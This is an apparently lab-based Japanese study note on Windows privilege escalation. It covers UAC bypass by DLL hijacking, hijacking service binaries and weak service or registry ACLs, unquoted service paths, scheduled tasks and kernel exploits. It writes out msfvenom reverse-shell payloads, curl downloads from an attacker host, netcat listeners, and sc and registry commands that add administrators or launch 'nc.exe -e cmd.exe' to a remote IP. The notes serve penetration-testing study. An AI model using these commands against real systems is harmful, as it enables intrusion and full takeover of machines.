|---|---|---|
|ユーザーアカウント制御：組み込みの Administrator アカウントに対する管理者承認モード|FilterAdministratorToken|無効|
|ユーザーアカウント制御：UIAccess アプリケーションがセキュア デスクトップを使用せずに昇格のプロンプトを表示できるようにする|EnableUIADesktopToggle|無効|
|ユーザーアカウント制御：管理者承認モードでの管理者に対する昇格プロンプトの動作|ConsentPromptBehaviorAdmin|非Windowsバイナリに対して同意を求める|
|ユーザーアカウント制御：標準ユーザーに対する昇格プロンプトの動作|ConsentPromptBehaviorUser|セキュアデスクトップで資格情報を求める|
|ユーザーアカウント制御：アプリケーションのインストールを検出して昇格を促す|EnableInstallerDetection|有効（Homeのデフォルト）、無効（Enterpriseのデフォルト）|
|ユーザーアカウント制御：署名および検証された実行可能ファイルのみを昇格する|ValidateAdminCodeSignatures|無効|
|ユーザーアカウント制御：UIAccess アプリケーションを安全な場所にインストールされている場合のみ昇格する|EnableSecureUIAPaths|有効|
|ユーザーアカウント制御：すべての管理者を管理者承認モードで実行する|EnableLUA|有効|
|ユーザーアカウント制御：昇格を求めるときにセキュア デスクトップに切り替える|PromptOnSecureDesktop|有効|
|ユーザーアカウント制御：ファイルおよびレジストリの書き込み失敗をユーザーごとの場所に仮想化する|EnableVirtualization|有効|

UACは有効にすべき
- 攻撃者が権限を獲得することを完全に阻止しないとしても、そのプロセスを遅らせ、より痕跡を残さざるを得なくなる追加の一歩となる


UACが有効であることの確認
- GUIの同意プロンプトのコマンドラインバージョンはない
- したがって、特権付きアクセストークンでコマンドを実行するには、UACをバイパスする必要がある
- まず、UACが有効かどうか、有効な場合はどのレベルで有効になっているかを確認しましょう。
```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

UACレベルの確認
- ConsentPromptBehaviorAdmin の値は `0x5` であり、これはUACの最も高いレベルである「常に通知」が有効になっていることを意味する
- この最高レベルでは、UACバイパスの手法は少なくなる
```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

Windowsバージョンの確認
- UACバイパスは、異なるWindowsビルドの欠陥や意図しない機能を利用する
- 権限昇格を試みようとしているWindowsのビルドを確認する
- これはビルドバージョン 14393 を返す
	- 検索することで、OSの詳細なバージョンがわかる
```powershell-session
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
- UACMEプロジェクトは、UACバイパスの手法リストを維持しており、影響を受けるWindowsビルド番号、使用される技術、およびMicrosoftが修正のためのセキュリティ更新プログラムを発行したかどうかの情報が含まれている
- Windows 10ビルド14393で動作するとされている技術番号54を使用する
- 自動昇格するバイナリ SystemPropertiesAdvanced.exe の32ビットバージョンをターゲットとしている

### UACバイパス
- UACが有効な場合でも、権限昇格（標準ユーザーから管理者やSYSTEM権限になること）ができることがある = UACバイパス
	- UACバイパスは、Windowsの仕組みやプログラムの「穴」を突いて、確認画面を出さずに高い権限でプログラムを実行させる技術
	- UACの確認レベルが高いほどバイパスは難しくなる傾向がある
- UACバイパスの一例（DLLハイジャック）
	- 管理者権限で自動的に起動するプログラムの中には、必要な「DLL」という部品プログラムを探すときに、決まった順番でフォルダを探しに行くものがある
	- このとき、**ユーザーが書き込めるフォルダ（例: C:\Users\[ユーザー名]\AppData\Local\Microsoft\WindowsApps）を、管理者権限で動くプログラムより先に探しに行ってしまうことがある**
	- 攻撃者は、この仕組みを利用して、プログラムが探しているDLLと同じ名前の悪意のあるDLLを作成し、ユーザーが書き込めるフォルダに置く
	- すると、管理者権限で自動起動したプログラムが、間違って攻撃者のDLLを読み込んでしまい、悪意のあるコードが管理者権限で実行されてしまう
- Windowsは、UAC同意プロンプトを必要とせずに自動昇格を許可する多くの信頼されたバイナリを持っている
- `SystemPropertiesAdvanced.exe`の32ビットバージョンは、システム復元機能で使用される存在しないDLL srrstr.dll をロードしようとする

DLLを検索する際、Windowsは以下の検索順序を使用する
1. アプリケーションがロードされたディレクトリ。
2. 64ビットシステムの場合はシステムディレクトリ `C:\Windows\System32`。
3. 16ビットシステムディレクトリ `C:\Windows\System` (64ビットシステムではサポートされていません)。
4. Windowsディレクトリ。
5. PATH環境変数にリストされているすべてのディレクトリ。

Path変数のレビュー
- コマンド `cmd /c echo %PATH%` を使用してパス変数を調べてみる
- これにより、以下のデフォルトフォルダが表示される。
- WindowsApps フォルダはユーザーのプロファイル内にあり、ユーザーによって書き込み可能
	- 悪意のある srrstr.dll DLLを WindowsApps フォルダに配置し、昇格されたコンテキストでロードされるようにすることで、DLLハイジャックを使用してUACをバイパスできる可能性がある
- **C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;**の中にバイナリがあった時にのみ使える手法
```powershell-session
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

悪意のある srrstr.dll DLL の生成
- まず、リバースシェルを実行するDLLを生成する
```shell-session
snowyowl644@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

攻撃ホストでのPython HTTPサーバーの起動
```shell-session
snowyowl644@htb[/htb]$ sudo python3 -m http.server 8080
```

ターゲットへのDLLのダウンロード
- ターゲットシステムに悪意のあるDLLをダウンロードし、攻撃マシンでNetcatリスナーを起動する
```powershell-session
PS C:\htb>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

```sh
snowyowl644@htb[/htb]$ nc -lvnp 8443
```

接続のテスト
- 悪意のある srrstr.dll ファイルを実行すると、通常のユーザー権限（UAC有効）を示すシェルが返ってくる
- テストするために、rundll32.exe を使用してDLLを実行し、リバースシェル接続を取得できる
```cmd-session
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

接続が返ってきたら、通常のユーザー権限であることがわかる
```shell-session
snowyowl644@htb[/htb]$ nc -lnvp 8443

listening on [any] 8443 ...

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Users\sarah> whoami /priv

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

ターゲットホストでの `SystemPropertiesAdvanced.exe` の実行
- 進む前に、以前の実行で起動した rundll32 プロセスがすべて終了していることを確認する必要がある
```cmd
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```

これで、ターゲットホストから SystemPropertiesAdvanced.exe の32ビットバージョンを実行できる
```cmd
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

リスナーで確認すると、ほぼ瞬時に接続が返ってくる
- 必要な場合に有効化できる特権を示す昇格されたシェルを取得できる
```shell-session
snowyowl644@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32>whoami /priv
```


- 攻撃の結果
	- 標準ユーザー権限だったのが、DLLハイジャックによって管理者権限やSYSTEM権限のシェル（コマンド実行画面）を獲得できる
	- これにより、システム上でほぼ何でもできてしまうようになる
- まとめ
	- UACは便利な機能だが、権限昇格を完全に防ぐものではない
	- Windowsのバージョンによっては、UACバイパスの脆弱性が存在する可能性がある（ただし、Windows Updateで対策されていることも多い）
	- UACを有効にしておくことは基本的なセキュリティ対策として重要だが、それだけに頼らず、システムのパッチ適用や他のセキュリティ対策も組み合わせる必要がある

## サービスバイナリハイジャック

大まかな攻撃の流れ
1. 脆弱なexeを見つける
2. そのexeがサービスとして実行されているか
    - `Get-CimInstance -ClassName win32_service` や `sc.exe qc <サービス名>` で確認
    - ただのユーザーが手動で実行するexeではダメ
3. サービスが高権限で実行されているか
    - `LocalSystem` や `NT AUTHORITY\SYSTEM` で実行されているか確認
    - 低権限サービスを乗っ取っても意味がない
4. サービスを起動できるか
    - 再起動権限があるか、自動起動設定か、など

- **Windowsの権限上、サービスの実行バイナリパスを変更できるか確認する権限と、サービスの実行バイナリパスを変更できる権限は異なっていて、確認できなくても変更できるケースがあるので、必ず、一回試して確認する**
- 具体例 : [[172.16.191.83 CLIENT02#WinPeas]]
### 列挙

**WinPEAS**
ファイルのパーミッションが弱いことがわかる
- SharpUp.exeはいくつか権限不足でスキップするから、WinPEASでも実行する
- 「[Allow: AllAccess]」ではなくても「[Allow: WriteData/CreateFiles]」って出力されてる全てのexeに脆弱性がある可能性あり
中でも注目すべき箇所
- Service Information 


**SharpUp**
- GhostPackスイートのツールである[SharpUp](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)を使用して、弱いACLを持つサービスバイナリをチェックできる
	- しかし、しばしば、見落としていることが多い
```powershell-session
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```

**Get-ServiceAcl.ps1**
```sh
wget https://github.com/Sambal0x/tools/raw/refs/heads/master/Get-ServiceAcl.ps1
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\Get-ServiceAcl.ps1 .
```

**Get-CimInstance**
- より広く現在実行されているサービスと実行ファイルを見る
```sh
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

**PowerUp.ps1**
```sh
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Privesc/PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1

# サービスバイナリや構成ファイルなど、現在のユーザーが変更できるサービスを表示
Get-ModifiableServiceFile

# 
```

**exeからサービスを探す**
```sh
*Evil-WinRM* PS C:\Users\alex\Documents> reg query "HKLM\SYSTEM\CurrentControlSet\Services" /s | findstr /i "<バイナリファイル名からexeを除いたもの>"
```


### バイナリの権限確認
**icacls**
- [icacls](https://ss64.com/nt/icacls.html) を使用して脆弱性を確認し、EVERYONE および BUILTIN\Users グループにディレクトリへのフル権限が付与されていること、したがって非特権システムユーザーがディレクトリとその内容を操作できることを確認できる

| マスク | 権限          |
| --- | ----------- |
| F   | フルアクセス      |
| M   | 変更アクセス      |
| RX  | 読み取りと実行アクセス |
| R   | 読み取り専用アクセス  |
| W   | 書き込み専用アクセス  |

- (I) は継承された権限
	- この出力は、UsersとEveryoneが `C:\Program Files (x86)\PCProtect` ディレクトリに対してフル権限を持っていることを示唆しており、そのディレクトリ内のファイル（このexeファイルを含む）もその権限を継承していることを意味する
```powershell-session
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

> 脆弱かを見極めるポイント
- 掌握できているユーザーでバイナリを書き換えることができるか

**sc.exe**
scでサービスの権限と種類取得できる
- 実行される権限は、「SERVICE_START_NAME」を見る
	- **`LocalSystem`** - 最高権限（NT AUTHORITY\SYSTEM）。ほぼすべてのシステムリソースにアクセス可能
	- **`NT AUTHORITY\SYSTEM`** - LocalSystemと同じ
	- **`NetworkService`** - ネットワーク認証が可能な制限付き権限
	- **`LocalService`** - 制限された権限。最小限のローカルリソースのみ

`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EnterpriseService\Security`の場合、EnterpriseServiceをクエリに入れる

```sh
*Evil-WinRM* PS C:\Users\wario\Documents>  sc.exe qc auditTracker
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: auditTracker
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\DevelopmentExecutables\auditTracker.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : auditTracker
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

> 脆弱かを見極めるポイント
- サービスが、`LocalSystem`か`NT AUTHORITY\SYSTEM`で実行されるか

### Exploit
#### サービス実行権限を悪用
**バイナリの置き換え**
- このサービスは非特権ユーザーでも開始可能であるため、元のバイナリのバックアップを取り、msfvenom で生成した悪意のあるバイナリに置き換えることができる
- これにより、SYSTEM権限でのリバースシェルを取得したり、ローカル管理者ユーザーを追加してマシンに対する完全な管理制御を獲得したりできる
```cmd-session
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

書き換え
```sh
sc.exe config <サービス名> binPath= "C:\Users\dharding\test.exe"
```

```sh
copy auditTracker_evil.exe C:\DevelopmentExecutables\auditTracker.exe
```

実行
```sh
sc.exe start auditTracker
```

### ケース
サービス経由でバイナリを実行するには、サービスを再起動する必要があるので、再起動したいが、再起動する権限がない
```sh
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```

サービスが再起動するタイミングを調べる
-  StartMode Auto : 再起動後に自動的に起動する
```sh
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```

再起動を行える権限を持っているのかを確認する
`whoami /all`を実行し、**SeShutdownPrivilege**権限を持っていることを確認する
- SeShutdownPrivilege 権限が存在しない場合は、被害者が手動でサービスを開始するまで待たなければならず、非常に不便

再起動を行う
```sh
shutdown /r /t 0 
```

## サービスACLの脆弱性

### 列挙
**SharpUp**
- 変更可能なサービス設定がないか確認できる
```cmd-session
C:\htb> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### 権限確認

**AccessChk**
- SysinternalsスイートのAccessChkを使用して、サービスに対する権限を列挙する
- 使用するフラグは、順に `-q`（バナーを省略）、`-u`（エラーを抑制）、`-v`（詳細）、`-c`（Windowsサービス名を指定）、`-w`（書き込みアクセス権を持つオブジェクトのみ表示）
```cmd-session
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
```
> 脆弱かを見極めるポイント
- 掌握できているユーザーが `SERVICE_ALL_ACCESS` や `SERVICE_CHANGE_CONFIG` 権限を持っているか

**sc.exe**
- サービスの実行権限を確認する
```sh
sc.exe qc WindscribeService
```
> 脆弱かを見極めるポイント
- サービスが、`LocalSystem`か`NT AUTHORITY\SYSTEM`で実行されるか

### Exploit

**サービスのbinpath変更**
- サービスに対する `SERVICE_ALL_ACCESS` を使用して、バイナリパスを悪意のあるコマンドに変更できる
- リバースシェルバイナリのような任意のコマンドまたは実行可能ファイルを実行するようにバイナリパスを設定できる
```cmd-session
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

**サービスの再起動**
- サービスを停止・開始して、新しい binpath コマンドを実行させる
```cmd-session
C:\htb> sc stop WindscribeService
C:\htb> sc start WindscribeService
```


## DLL ハイジャック
攻撃が成功する2つのパターン
1.  サービスバイナリが実行するDLLを実行する
2. DLLの検索順序を乗っ取る
	- Windows標準のDLLのDLLの検索順序
	1. アプリケーションが読み込まれたディレクトリ
	2. システムディレクトリ
	3. 16ビットシステムディレクトリ
	4. Windowsディレクトリ
	5. カレントディレクトリ
	6. PATH環境変数に記載されているディレクトリ

### 列挙

**ケース1 :インストールされているappに存在する、DLLハイジャックの脆弱性を利用する**
インストールされているアプリケーションを列挙する
```sh
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
アプリケーションのバージョンからDLLハイジャックの脆弱性があることを特定する
> 確認するべきこと
> ・どこにDLLを置くことで、DLLハイジャックを実行できるのかを確認する

**ケース2：バイナリファイルにDLL ハイジャックが存在するのかを確認する**
Process Monitorを使うことができる
- しかし、Process Monitorの実行には管理者権限が必要
- バイナリファイルをローカルマシンにコピーして、実行することで、DLLアクティビティを一覧表示できる

フィルターを有効活用することができる
フィルターは、以下のように設定する
- Column（列）: Process Name
- Relation（関係）: is
- Value（値）: filezilla.exe
- Action（動作）: Include

フィルターを適用したら、「クリア」ボタンを使用して現在のイベントをすべてクリアする

### 権限の確認

脆弱なアプリケーションの実行ファイルなどが置いてある場所に、書き込めるかを確認する
```sh
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
dir
```
書き込める ⇨ そこにdllを保存すれば良い

**書き込めない ⇨ 以下のDLLの検索順序を利用する**
1. スケジュールタスクのバイナリがあるディレクトリ
2. C:\Windows\System32\
3. C:\Windows\System\
	- (16bit互換性用、現代のWindowsではほぼ使われない)
4. C:\Windows\
5. カレントディレクトリ
	- スケジュールタスクの**カレントディレクトリ**を確認
	- "Start In" フィールドを探す
```sh
schtasks /query /tn <スケジュールタスク名> /fo LIST /v
```
6. PATH環境変数のディレクトリ
	- PATHの確認
		- ユーザーディレクトリが含まれていたら、そこにおけば良い
```sh
$env:Path.Split(';')
```

**でも、元からできないというラビットホールの可能性もある**


### Exploit
見つけた脆弱なDLLの名前で、リバースシェルを作り、DLLを変更する
例
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=7777 -f dll -o TextShaping.sll
```
また、DLLを変更した時に、脆弱なバイナリを自分で実行しても自分の権限で実行されてしまう
なので、管理者ユーザーが実行してくれるのをncで待ち受けていれば、そのうち管理者権限でシェルが取れる可能性はある

DLLのテスト
```sh
rundll32.exe C:\Users\emma\AppData\Local\Microsoft\WindowsApps\BetaLibrary.dll,DllMain
```

##  引用符で囲まれていないサービスパス

**概要**
サービス実行パスが引用符で囲まれていない場合に発生する権限昇格の脆弱性。Windowsのパス解決の仕様を悪用し、意図しない実行ファイルをSYSTEM権限で実行させる。

**脆弱性の条件**
- サービスパスに**スペースが含まれる**
- サービスパスが**引用符で囲まれていない**
- 攻撃者が**パスの途中ディレクトリへの書き込み権限**を持つ

**パス解決の順序**
Windowsは拡張子を自動補完し、スペースで区切られた位置から順に実行ファイルを探索する。

例： `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

1. `C:\Program.exe`
2. `C:\Program Files.exe`
3. `C:\Program Files (x86)\System.exe`
4. `C:\Program Files (x86)\System Explorer.exe`
5. `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

**攻撃手順**
1. 書き込み可能なディレクトリを特定（例：`C:\Program Files`）
2. 悪意のある実行ファイルを配置（例：`C:\Program Files\System.exe`）
3. サービス再起動時に、偽の実行ファイルがSYSTEM権限で実行される

### 列挙
引用符で囲まれていないサービスパスの検索
cmd.exe
```cmd-session
# 自動起動サービスで引用符なしパスを探す
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 全サービスで引用符なしパスを探す
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

PowerShell
```sh
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq "Auto" -and $_.PathName -notlike "*C:\Windows\*" -and $_.PathName -notlike '*"*"*'} | Select-Object Name, DisplayName, PathName, StartMode
```

PowerUp.ps1
```sh
powershell -ep bypass

```

### 権限確認
見つけたサービスを開始・停止できるのかを確認する
```sh
Start-Service <Service名>
```

```sh
Stop-Service <Service名>
```

サービスバイナリを取得するまでのwindowsの検索パスの中で、パスのアクセス権を確認する

Windowsのサービスバイナリ検索パス一覧
```C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

どこのフォルダでバイナリを書き換える権限があるのかの確認
```sh
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
icacls "C:\Program Files\Enterprise Apps\Current Version"
```
今属しているグループで、(W) (F) (M)があったら、そこのフォルダでバイナリを置き換えられる

### Exploit
サービスバイナリと同じ名前のリバースシェルを作成して、書き込みができるフォルダに置く
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=7777 -f exe -oT <サービスバイナリ>.exe
```

サービスをスタートする
```sh
Start-Service GammaService
```

## スケジュールされたタスク

この脆弱性を利用するために確認するべき情報
- どのユーザーアカウント（プリンシパル）でこのタスクが実行されるか？
- どんなトリガーが設定されているか？
- トリガーが満たされた時に、どんなアクションが実行されるか？
### 列挙
WinPEAS.exeの「**Scheduled Applications --Non Microsoft--**」の出力を見る！！！！！！！！！！！！

スケジュールされたすべてのタスクを確認する
- この時に見るべきは、「Author」 、「TaskName」、「Task To Run」、「Run As User」、
「Next Run Time」「Start In: N/A」
```sh
schtasks /query /fo LIST /v
```

見るべきもののみ出力
```sh
schtasks /query /fo LIST /v | Select-String -Pattern "(Author|TaskName|Task To Run|Run As User|Next Run Time)" -Context 0,0
```


特定のexeをスケジュールタスクから探す
```sh
schtasks /query /fo LIST /v | Select-String -Pattern "EnterpriseService"
```

### 権限確認
タスクで実行されるバイナリに対する権限を確認する
- (W) (F) (M)があったら、書き換えられる
```sh
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

### Exploit
リバースシェルを作成する
```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=7777 -f exe -o <サービスバイナリ>.exe
```


## 緩いレジストリACL

- サービスの設定などが書かれているレジストリキーに対して、普通のユーザーが書き込み権限を持っている 
- サービスの起動パスをレジストリから書き換えることで、弱いサービス権限の攻撃と同様のことができてしまう 
- **起動時に自動実行される設定が緩い (Modifiable Registry Autorun)**
	- システム起動時やユーザーログオン時に動くプログラムの設定がレジストリにあり、そのレジストリやプログラムファイルに書き込み権限がある 
	- 悪意のあるプログラムに書き換えたり、設定を変更したりすることで、次に起動またはログオンした際に高い権限で悪意のあるコードが動いてしまう
**レジストリ内の弱いサービスACLの確認**
[accesschk.exe](https://github.com/hansalemaos/accesschk2df/blob/main/accesschk.exe)
```cmd-session
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM\System\CurrentControlSet\services\ModelManagerService  <-- 書き込み権限あり
        KEY_ALL_ACCESS  <-- レジストリキー全体へのアクセス権限

<SNIP>
```
- この出力は、ユーザー mrb3n が `HKLM\System\CurrentControlSet\services\ModelManagerService` というレジストリキーに対して KEY_ALL_ACCESS （完全な制御権）を持っていることを示している
- サービスのバイナリパスはこのレジストリキーの下に保存されている

**PowerShellを使用したImagePathの変更**
- PowerShellコマンドレット Set-ItemProperty を使用して ImagePath の値を変更することで、これを悪用できる
- 例えば、以下のコマンドを使用する
```powershell-session
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

これにより、サービス起動時に指定したNetcatコマンド（この場合はリバースシェル）がSYSTEM権限で実行されるようになる

### 変更可能なレジストリ自動実行バイナリ
スタートアッププログラムの確認
- WMICを使用して、システム起動時にどのようなプログラムが実行されるかを確認できる
- 特定のバイナリのレジストリに書き込み権限がある場合、またはリストされているバイナリを上書きできる場合、次にそのユーザーがログオンしたときに別のユーザーとして権限昇格できる可能性がある
```powershell-session
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:\Users\mrb3n\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : Windscribe
command  : "C:\Program Files (x86)\Windscribe\Windscribe.exe" -os_restart
Location : HKU\S-1-5-21-2374636737-2633833024-1808968233-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : WINLPE-WS01\mrb3n

Name     : SecurityHealth
command  : %windir%\system32\SecurityHealthSystray.exe
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware User Process
command  : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public

Name     : VMware VM3DService Process
command  : "C:\WINDOWS\system32\vm3dservice.exe" -u
Location : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User     : Public
```

- Windowsには多くの「自動実行ポイント（autoruns location）」が存在し、これらは起動時やログオン時に指定されたプログラムを自動実行します。
- 代表例：HKLM\Software\Microsoft\Windows\CurrentVersion\Run（システム全体）、HKU\[SID]\Software\Microsoft\Windows\CurrentVersion\Run（ユーザー個別）
権限昇格が可能なケース
	1.	高権限（HKLMなど）の Run キーに書き込み権限がある
	•	→ マルウェアや任意コマンドを登録すれば、次回起動時に SYSTEM 権限で実行される
	2.	HKUの Run キーの実行バイナリに書き込み権限がある
	•	→ 実行ファイルをすり替えることで、対象ユーザーのログオン時にコードを実行可能
要点
- Runキーの“レジストリそのもの”か“実行ファイル”に書き込めるなら、昇格のチャンスあり。


## カーネルエクスプロイト
WindowsとKernalExploitの関係性について
https://docs.google.com/spreadsheets/d/1jKpzj2x_D3mKrYAfZuF7TjtcIDy-rUHn9Bn6rGmlFZE/edit?usp=sharing
![](https://i.imgur.com/E4wO2OP.png)


- カーネルエクスプロイトとは、Windows OSの「核」であるカーネル（とても低いレベルで動く重要な部分）にある脆弱性を突く攻撃
	- これが悪用されると、攻撃者はOSの最も強い権限（SYSTEM権限など）を奪うことができる
	- SYSTEM権限を持つと、システム上のほぼ全てを制御できてしまう
- カーネルエクスプロイトはなぜ起こる？
	- OSやプログラムに「脆弱性（セキュリティ上の欠陥）」が見つかることがある
	- 攻撃者はその脆弱性を利用した「エクスプロイトコード」を作成・実行する
	- Windowsのバージョンが古かったり、最新のセキュリティパッチが適用されていなかったりすると、既知の脆弱性が放置されている可能性が高くなる
- 具体的なカーネルエクスプロイトの例と影響
	- **過去の有名な脆弱性（MS08-067, MS17-010/EternalBlueなど）**
		- これらはWindows XP時代から存在し、ネットワーク越し（リモート）やローカルでSYSTEM権限を奪うために使われた
		- ランサムウェアWannaCryなどで悪用されたEternalBlueは特に有名
		- 古いOSや、パッチが当たっていないシステムでは今でも危険
	- **比較的最近の脆弱性（HiveNightmare/CVE-2021-36934, PrintNightmare/CVE-2021-1675など）**
		- **HiveNightmare**：パッチが当たっていないWindows 10などで、一般ユーザーでもシステムの重要なパスワード情報（SAM/SYSTEM/SECURITYレジストリハイブ）を読み取れてしまう脆弱性。これにより、ローカルアカウントのパスワードハッシュなどを簡単に取得できた。（現在はパッチ済み）
		- **PrintNightmare**：印刷スプーラーサービス（SYSTEM権限で動く）の脆弱性。パッチが当たっていないシステムでは、認証されたユーザーなら誰でもSYSTEM権限で任意のコード（自分を管理者にしたり、悪意のあるプログラムを実行させたり）を実行できてしまった。（現在はパッチ済みだが、初期パッチは不完全だった）
